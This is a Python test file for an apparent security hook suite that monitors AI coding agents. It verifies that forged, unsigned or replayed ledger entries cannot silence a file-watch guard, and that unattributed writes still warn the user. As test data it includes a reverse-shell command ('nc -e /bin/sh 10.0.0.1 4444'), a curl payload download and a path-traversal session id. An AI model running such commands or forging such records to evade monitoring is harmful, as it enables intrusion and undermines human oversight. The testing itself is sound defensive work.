#!/usr/bin/env python3
"""The write ledger and the FileChanged guard.

Scoped deliberately to the parts that carry exploitation risk, not to line
coverage. Three things here can be attacked, and each gets a test that tries:

1. **The ledger's MAC.** A forged entry makes an unattributed write look
   attributable, which is what silences ``file_watch_guard``. Every field of a
   ledger line is public and derivable, and the file sits in ``$HOME`` where no
   Bash-path guard covers it, so "only we can write it" was never true. The MAC
   is the whole control.
2. **The domain separation from ``memo.py``.** Both sign with ``memo.key``. If
   the ledger accepted a memo's signature, a legitimately-signed memo could be
   replayed as a ledger line.
3. **Self-write suppression.** It has to swallow ForceField's own state writes
   and *not* swallow an agent's write to the same directory. A rule that
   swallows both is indistinguishable from having no watch at all, and it would
   blind the guard to exactly the spawn-counter tampering the directory is
   watched to catch.

Everything else here is the correspondence gate between the watch roots and the
sink patterns, which fails when the two lists drift.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
HOOKS = os.path.join(ROOT, "hooks")
sys.path.insert(0, HERE)
sys.path.insert(0, HOOKS)

import _isolated_home  # noqa: E402  (import-time $HOME diversion)

HOME = _isolated_home.HOME

PASSED = 0


def check(condition, label):
    global PASSED
    assert condition, "FAILED: %s" % label
    PASSED += 1


SESSION = "11111111-2222-3333-4444-555555555555"


# ---------------------------------------------------------------------------
# 1. The ledger MAC
# ---------------------------------------------------------------------------

if True:
    import write_ledger

    check(write_ledger.ledger_path(SESSION) is not None,
          "a well-formed session id yields a ledger path")
    check(write_ledger.ledger_path("../../etc/passwd") is None,
          "a session id with separators is refused before it reaches a file name")
    check(write_ledger.ledger_path("") is None,
          "an empty session id yields no ledger path")

    target = "/tmp/forcefield-ledger-probe/out.sh"
    check(write_ledger.attribution(SESSION, target) is None,
          "nothing is attributable before anything is recorded")

    check(write_ledger.record_gate(SESSION, target, "Write"),
          "a gated write is recorded")
    check(write_ledger.attribution(SESSION, target) == "gate",
          "a recorded gated write is attributable to the gate")

    # A forged line, written exactly as an attacker with shell access would: the
    # schema is public, so every field can be reproduced. Only the MAC cannot.
    forged_path = "/tmp/forcefield-ledger-probe/forged.sh"
    path = write_ledger.ledger_path(SESSION)
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({
            "kind": "gate", "at": time.time(), "path": forged_path,
            "tool": "Write", "mac": "0" * 64,
        }) + "\n")
    check(write_ledger.attribution(SESSION, forged_path) is None,
          "a forged ledger line does not make a write attributable")

    # Same, but with the MAC field absent entirely rather than wrong.
    unsigned_path = "/tmp/forcefield-ledger-probe/unsigned.sh"
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({
            "kind": "gate", "at": time.time(), "path": unsigned_path,
            "tool": "Write",
        }) + "\n")
    check(write_ledger.attribution(SESSION, unsigned_path) is None,
          "an unsigned ledger line is rejected")

    # A genuine entry re-signed for a DIFFERENT session must not carry over.
    # The MAC binds the session id precisely so a line cannot be relocated.
    other = "22222222-3333-4444-5555-666666666666"
    check(write_ledger.attribution(other, target) is None,
          "a genuine entry does not verify under another session id")

    # Corrupt input must read as "nothing recorded", never raise.
    with open(path, "a", encoding="utf-8") as handle:
        handle.write("{not json at all\n\n   \n")
    check(write_ledger.attribution(SESSION, target) == "gate",
          "a corrupt line does not destroy the entries around it")

    # 2. Domain separation from the memo store: a value signed the way memo.py
    # signs must not verify as a ledger line.
    import hashlib
    import hmac

    import memo

    key = memo._store_key()
    check(key is not None, "the shared HMAC key is available")
    replay = {"kind": "gate", "at": time.time(),
              "path": "/tmp/forcefield-ledger-probe/replay.sh", "tool": "Write"}
    body = json.dumps(
        {f: replay.get(f) for f in write_ledger._SIGNED_FIELDS},
        sort_keys=True, separators=(",", ":"),
    ).encode("utf-8")
    replay["mac"] = hmac.new(key, body, hashlib.sha256).hexdigest()
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(replay) + "\n")
    check(write_ledger.attribution(SESSION, replay["path"]) is None,
          "a signature without the ledger's domain prefix does not verify")


# ---------------------------------------------------------------------------
# TTL and bounds
# ---------------------------------------------------------------------------

if True:
    import write_ledger

    stale = "/tmp/forcefield-ledger-probe/stale.sh"
    write_ledger.record_gate(SESSION, stale, "Write")
    future = time.time() + write_ledger.TTL_SECONDS + 60
    check(write_ledger.attribution(SESSION, stale, now=future) is None,
          "an entry past the TTL is not attributable")
    check(write_ledger.attribution(SESSION, stale) == "gate",
          "the same entry inside the TTL still is")

    for index in range(write_ledger.MAX_ENTRIES + 10):
        write_ledger.record_gate(SESSION, "/tmp/ff-evict/%d" % index, "Write")
    check(write_ledger.attribution(SESSION, "/tmp/ff-evict/0") is None,
          "the oldest entries are evicted once the ring is full")
    check(write_ledger.attribution(
        SESSION, "/tmp/ff-evict/%d" % (write_ledger.MAX_ENTRIES + 9)) == "gate",
        "the newest entry survives eviction")


# ---------------------------------------------------------------------------
# 3. Self-write suppression, both halves
# ---------------------------------------------------------------------------

def run_hook(script, event, home_env):
    proc = subprocess.run(
        [sys.executable, os.path.join(HOOKS, script)],
        input=json.dumps(event), capture_output=True, text=True,
        env=home_env, cwd=ROOT, timeout=30,
    )
    return proc


if True:
    import write_ledger
    home = HOME

    env = dict(os.environ, HOME=str(home), USERPROFILE=str(home),
               FORCEFIELD_LOG_SINKS="file")
    log = os.path.join(str(home), ".claude", "hooks", "security.log")

    def records():
        if not os.path.exists(log):
            return []
        out = []
        with open(log, encoding="utf-8") as handle:
            for line in handle:
                line = line.strip()
                if line:
                    try:
                        out.append(json.loads(line))
                    except ValueError:
                        pass
        return out

    def watch_records():
        return [r for r in records()
                if r.get("Attributes", {}).get("forcefield.guard")
                == "file_watch_guard"]

    watched = os.path.join(str(home), ".claude", "forcefield", "memos.json")
    os.makedirs(os.path.dirname(watched), exist_ok=True)

    event = {
        "hook_event_name": "FileChanged", "event": "change",
        "file_path": watched, "session_id": SESSION, "cwd": str(home),
    }

    # Half one: ForceField's own write is attributed and reported as such.
    write_ledger.record_self(SESSION, os.path.realpath(watched))
    proc = run_hook("file_watch_guard.py", event, env)
    check(proc.returncode == 0, "file_watch_guard exits cleanly on a self-write")
    found = watch_records()
    check(len(found) == 1, "a self-write still produces exactly one record")
    attrs = found[-1]["Attributes"]
    check(attrs["forcefield.attribution"] == "self",
          "a ForceField state write is attributed to ForceField")
    check(attrs["forcefield.out_of_band"] is False,
          "a self-write is not out of band")
    check("systemMessage" not in json.loads(proc.stdout or "{}"),
          "a self-write does not interrupt the user")

    # Half two, which is the one that matters: an unattributed write to the SAME
    # directory is still reported. A suppression rule that swallowed this would
    # be indistinguishable from not watching the directory at all.
    other = os.path.join(str(home), ".claude", "forcefield", "state",
                         "spawn-someone-else.json")
    os.makedirs(os.path.dirname(other), exist_ok=True)
    proc = run_hook("file_watch_guard.py",
                    dict(event, file_path=other, event="add"), env)
    found = watch_records()
    check(len(found) == 2, "an unattributed write to the same directory records")
    attrs = found[-1]["Attributes"]
    check(attrs["forcefield.attribution"] == "none",
          "an unattributed write is not silently absorbed by the self rule")
    check(attrs["forcefield.out_of_band"] is True,
          "an unattributed write to a config sink is out of band")
    response = json.loads(proc.stdout or "{}")
    check("systemMessage" in response,
          "an out-of-band change to the control surface warns the user")

    # The watch set is re-asserted on every event, whatever the outcome.
    paths = response.get("hookSpecificOutput", {}).get("watchPaths")
    check(isinstance(paths, list) and paths,
          "every FileChanged response re-asserts the watch set")

    # A path matching no sink is not recorded at all.
    run_hook("file_watch_guard.py",
             dict(event, file_path=os.path.join(str(home), "notes.md")), env)
    check(len(watch_records()) == 2, "a path matching no sink writes no record")


# ---------------------------------------------------------------------------
# Correspondence: watch roots against the sink patterns
# ---------------------------------------------------------------------------

import filesystem_guard  # noqa: E402
import watch_roots  # noqa: E402

roots = watch_roots.watch_roots(os.getcwd())
check(roots and all(os.path.isabs(p) for p in roots),
      "every watch root is an absolute path")
check(len(roots) == len(set(roots)), "the watch set carries no duplicates")
check(roots == sorted(roots), "the watch set is sorted, so two sessions diff")

# The gate runs against both platforms' roots, unfiltered by what exists on this
# host: it asks whether the design covers every sink, which is a property of
# watch_roots.py rather than of the machine running the suite.
DESIGN = watch_roots.all_candidate_roots(os.getcwd())

# A directory root is watched recursively, so it covers any path beneath it, and
# a regex anchored on a filename cannot match the directory itself. The probe set
# is therefore every root plus every root joined with every literal path token
# appearing in any sink pattern. Built by cross-product rather than by hand, so
# there is no third list to drift: a sink is covered when some reachable path
# matches it.
TOKEN = re.compile(r"[A-Za-z0-9_.-]{2,}")
ALL_SINKS = dict(filesystem_guard.WRITE_SINK_PATTERNS)
ALL_SINKS.update(filesystem_guard.CONFIG_SINK_PATTERNS)
SOURCES = dict(filesystem_guard._WRITE_SINK_SOURCES)
SOURCES.update(filesystem_guard._CONFIG_SINK_SOURCES)

tokens = set()
for source in SOURCES.values():
    tokens.update(TOKEN.findall(source.replace("\\.", ".")))

probes = list(DESIGN)
for root in DESIGN:
    for token in tokens:
        probes.append(root + "/" + token)
        probes.append(root + "/" + token + "/x")
# Matched one probe at a time rather than against the joined text: several sink
# patterns anchor with `$`, which in a single joined search only matches the very
# end of the string and silently reports every anchored sink as uncovered.
for name, pattern in ALL_SINKS.items():
    if name in watch_roots.WATCH_EXEMPT:
        check(bool(watch_roots.WATCH_EXEMPT[name].strip()),
              "exempt sink %s states a reason" % name)
        continue
    check(any(pattern.search(probe) for probe in probes),
          "sink %s is reachable from a watch root, or is explicitly exempt" % name)

for name in watch_roots.WATCH_EXEMPT:
    check(name in ALL_SINKS, "exempt name %s is a real sink pattern" % name)

# ~/.claude itself must never become a root: it holds the session transcripts,
# the plugin cache, and ForceField's own log, and Claude Code watches a directory
# recursively with no depth bound. A record written under a watched root triggers
# an event that writes a record.
claude_dir = os.path.join(os.path.expanduser("~"), ".claude")
check(claude_dir not in DESIGN,
      "~/.claude is not a watch root (recursion would include the log itself)")
check(os.path.join(claude_dir, "hooks") not in DESIGN,
      "~/.claude/hooks is not a watch root (it holds security.log)")
check(os.path.join(claude_dir, "projects") not in DESIGN,
      "~/.claude/projects is not a watch root (session transcripts append)")


# ---------------------------------------------------------------------------
# Correlation: path extraction and the escalation split
# ---------------------------------------------------------------------------

if True:
    import write_ledger

    targets = write_ledger.extract_targets(
        "cat > /tmp/ff-probe/out.py <<'PY'\nimport os\nPY", cwd="/tmp")
    check(targets == [os.path.realpath("/tmp/ff-probe/out.py")],
          "a heredoc write yields its redirect target and nothing from the body")

    check(write_ledger.extract_targets("nc -e /bin/sh 10.0.0.1 4444") == [],
          "a command naming no file yields no targets, so it is never correlated")
    check(write_ledger.extract_targets("echo hi > /dev/null") == [],
          "/dev is not a correlation target")

    relative = write_ledger.extract_targets("curl -o payload.sh https://x/y",
                                            cwd="/tmp")
    check(relative == [os.path.realpath("/tmp/payload.sh")],
          "an output flag is resolved against the event cwd, not the process cwd")

    blocked = os.path.realpath("/tmp/ff-probe/out.py")
    write_ledger.record_block(SESSION, "exfil_guard", "pipe_to_shell", "deny",
                              [blocked])
    found = write_ledger.correlate(SESSION, blocked)
    check(found is not None and found["guard"] == "exfil_guard",
          "a later write to a blocked target correlates")
    check(write_ledger.correlate(SESSION, "/tmp/ff-probe/other.py") is None,
          "an unrelated path does not correlate")
    check(write_ledger.record_block(SESSION, "g", "p", "deny", []) is False,
          "a block naming no target is not recorded at all")

print("test_file_watch.py: %d assertions passed" % PASSED)
